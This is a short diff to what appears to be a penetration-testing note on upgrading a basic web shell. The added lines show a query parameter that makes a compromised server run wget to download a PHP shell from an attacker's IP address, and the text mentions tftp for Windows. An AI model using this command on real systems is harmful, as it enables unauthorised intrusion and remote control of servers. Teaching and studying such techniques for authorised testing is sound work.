@@ -28,4 +28,9 @@ We can of course just write a superlong query with a better shell. But sometimes
 
 On linux-machines we can use wget to download a more powerful shell.
 
+```
+?cmd=wget%20192.168.1.102/shell.php
+```
+
 On windows-machines we can use tftp. 
+
